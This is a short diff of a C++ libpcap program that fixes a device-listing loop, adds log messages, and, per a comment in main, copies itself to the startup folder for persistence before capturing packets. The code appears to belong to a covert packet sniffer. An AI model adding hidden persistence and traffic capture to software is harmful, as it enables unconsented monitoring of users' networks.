@@ -214,8 +214,8 @@ int size_of_list(pcap_if_t*  list) {
 	int size = 0;
 
 	//loops until d is NULL and counts elements
-	for (pcap_if_t* d = list; d; d->next) {
-		std::cout << d->name << std::endl;
+	for (pcap_if_t* d = list; d != NULL; d = d->next) {
+		std::cout << "Printing device list" << std::endl << d->description << std::endl;
 		size++;
 	}
 
@@ -232,6 +232,7 @@ int capture_em_packets() {
 	char error_msg[PCAP_ERRBUF_SIZE]; //error message buffer
 
 	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
+		std::cout << "did not get device list" << std::endl;
 		return -1;
 	}
 	
@@ -250,6 +251,7 @@ int capture_em_packets() {
 int main()
 {
 	//Implements persistence by copying itself to startup folder
+	//redirect output into stdout to buffer via pipe
 	startup_finder();
 
 	//capture packets
